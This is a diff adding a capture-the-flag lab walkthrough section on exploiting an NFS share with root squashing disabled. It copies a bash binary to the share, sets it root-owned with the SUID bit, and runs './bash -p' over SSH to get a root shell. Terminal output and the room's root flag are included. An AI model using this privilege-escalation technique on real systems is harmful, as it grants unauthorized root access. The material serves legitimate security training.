@@ -207,4 +207,161 @@ TASK 4: Exploiting NFS
 - Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges.
 -  However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.
 - So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!
-- 
+- Method
+	-> We're able to upload files to the NFS share, and control the permissions of these files.
+	-> We can set the permissions of whatever we upload, in this case a bash shell executable
+	->  We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!
+- Executable
+	-> Due to compatibility reasons,  we will obtain the bash executable directly from the target machine.
+	-> With the key obtained in the previous task, we can use SCP with the command 
+		scp -i key_name username@10.10.57.171:/bin/bash ~/Downloads/bash 
+	   to download it onto our attacking machine.
+	-> Another method to overcome compatibility issues is to obtain a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. 
+	->  You can use 
+		wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash 
+	    to download it in another way.
+
+a. First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.
+┌──(kali㉿kali)-[~]
+└─$ cd /tmp                                                                                                              
+b. Download the bash executable. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share.
+The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"
+┌──(kali㉿kali)-[/tmp]
+└─$ wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
+--2024-10-20 03:09:06--  https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
+Resolving github.com (github.com)... 20.207.73.82
+Connecting to github.com (github.com)|20.207.73.82|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Networks%202/bash [following]
+--2024-10-20 03:09:09--  https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1113504 (1.1M) [application/octet-stream]
+Saving to: ‘bash’
+
+bash                         100%[==============================================>]   1.06M  6.41MB/s    in 0.2s    
+
+2024-10-20 03:09:11 (6.41 MB/s) - ‘bash’ saved [1113504/1113504]                                                                                                              
+┌──(kali㉿kali)-[/tmp]
+└─$ ls
+bash
+mount
+ssh-ylVNz6FIAqHv
+systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-colord.service-p34aYT
+systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-haveged.service-6PfuPi
+systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-ModemManager.service-5b6YJj
+systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-polkit.service-iWilJv
+systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-systemd-logind.service-9AhFmc
+systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-upower.service-7O7tCN
+VMwareDnD
+vmware-root
+vmware-root_545-4257003801
+┌──(kali㉿kali)-[/tmp]
+└─$ cp bash /tmp/mount/cappucino   
+┌──(kali㉿kali)-[/tmp]
+└─$ cd mount/cappucino   
+┌──(kali㉿kali)-[/tmp/mount/cappucino]
+└─$ ls -la
+total 1124
+drwxr-xr-x 5 kali kali    4096 Oct 20 03:16 .
+drwxr-xr-x 3 root root    4096 Apr 21  2020 ..
+-rw-r--r-- 1 kali kali 1113504 Oct 20 03:16 bash
+-rw------- 1 kali kali       5 Jun  4  2020 .bash_history
+-rw-r--r-- 1 kali kali     220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 kali kali    3771 Apr  4  2018 .bashrc
+drwx------ 2 kali kali    4096 Apr 22  2020 .cache
+drwx------ 3 kali kali    4096 Apr 22  2020 .gnupg
+-rw-r--r-- 1 kali kali     807 Apr  4  2018 .profile
+drwx------ 2 kali kali    4096 Apr 22  2020 .ssh
+-rw-r--r-- 1 kali kali       0 Apr 22  2020 .sudo_as_admin_successful                                                                                                          
+┌──(kali㉿kali)-[/tmp/mount/cappucino]
+└─$ sudo chown root bash
+[sudo] password for kali: 
+
+c. Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?
+sol. s
+┌──(kali㉿kali)-[/tmp/mount/cappucino]
+└─$ sudo chmod +s bash
+
+d.Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". 
+What does the permission set look like? Make sure that it ends with -sr-x.
+sol. 
+┌──(kali㉿kali)-[/tmp/mount/cappucino]
+└─$ ls -la
+total 1124
+drwxr-xr-x 5 kali kali    4096 Oct 20 03:16 .
+drwxr-xr-x 3 root root    4096 Apr 21  2020 ..
+-rwsr-sr-x 1 root kali 1113504 Oct 20 03:16 bash
+-rw------- 1 kali kali       5 Jun  4  2020 .bash_history
+-rw-r--r-- 1 kali kali     220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 kali kali    3771 Apr  4  2018 .bashrc
+drwx------ 2 kali kali    4096 Apr 22  2020 .cache
+drwx------ 3 kali kali    4096 Apr 22  2020 .gnupg
+-rw-r--r-- 1 kali kali     807 Apr  4  2018 .profile
+drwx------ 2 kali kali    4096 Apr 22  2020 .ssh
+-rw-r--r-- 1 kali kali       0 Apr 22  2020 .sudo_as_admin_successful
+
+e. Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.
+Great! If all's gone well you should have a shell as root! What's the root flag?
+sol. THM{nfs_got_pwned}
+
+┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
+└─$ ssh -i id_rsa cappucino@10.10.79.146
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+  System information as of Sat Oct 19 03:41:11 UTC 2024
+  System load:  0.12              Processes:           101
+  Usage of /:   45.2% of 9.78GB   Users logged in:     0
+  Memory usage: 32%               IP address for eth0: 10.10.79.146
+  Swap usage:   0%
+44 packages can be updated.
+0 updates are security updates.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+Last login: Sat Oct 19 03:38:22 2024 from 10.9.0.101
+cappucino@polonfs:~$ ls -la
+total 1124
+drwxr-xr-x 5 cappucino cappucino    4096 Oct 20 07:16 .
+drwxr-xr-x 3 root      root         4096 Apr 21  2020 ..
+-rwsr-sr-x 1 root      cappucino 1113504 Oct 20 07:16 bash
+-rw------- 1 cappucino cappucino       5 Jun  4  2020 .bash_history
+-rw-r--r-- 1 cappucino cappucino     220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 cappucino cappucino    3771 Apr  4  2018 .bashrc
+drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .cache
+drwx------ 3 cappucino cappucino    4096 Apr 22  2020 .gnupg
+-rw-r--r-- 1 cappucino cappucino     807 Apr  4  2018 .profile
+drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .ssh
+-rw-r--r-- 1 cappucino cappucino       0 Apr 22  2020 .sudo_as_admin_successful
+cappucino@polonfs:~$ ./bash -p
+bash-4.4# ls
+bash
+bash-4.4# ls -la
+total 1124
+drwxr-xr-x 5 cappucino cappucino    4096 Oct 20 07:16 .
+drwxr-xr-x 3 root      root         4096 Apr 21  2020 ..
+-rwsr-sr-x 1 root      cappucino 1113504 Oct 20 07:16 bash
+-rw------- 1 cappucino cappucino       5 Jun  4  2020 .bash_history
+-rw-r--r-- 1 cappucino cappucino     220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 cappucino cappucino    3771 Apr  4  2018 .bashrc
+drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .cache
+drwx------ 3 cappucino cappucino    4096 Apr 22  2020 .gnupg
+-rw-r--r-- 1 cappucino cappucino     807 Apr  4  2018 .profile
+drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .ssh
+-rw-r--r-- 1 cappucino cappucino       0 Apr 22  2020 .sudo_as_admin_successful
+bash-4.4# cd ..
+bash-4.4# ls
+cappucino
+bash-4.4# cd ..
+bash-4.4# ls
+bin   cdrom  etc   initrd.img     lib   lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
+boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
+bash-4.4# cd root
+bash-4.4# ls
+root.txt
+bash-4.4# cat root.txt
+THM{nfs_got_pwned}
+
+TASK 5: Understanding SMTP
+
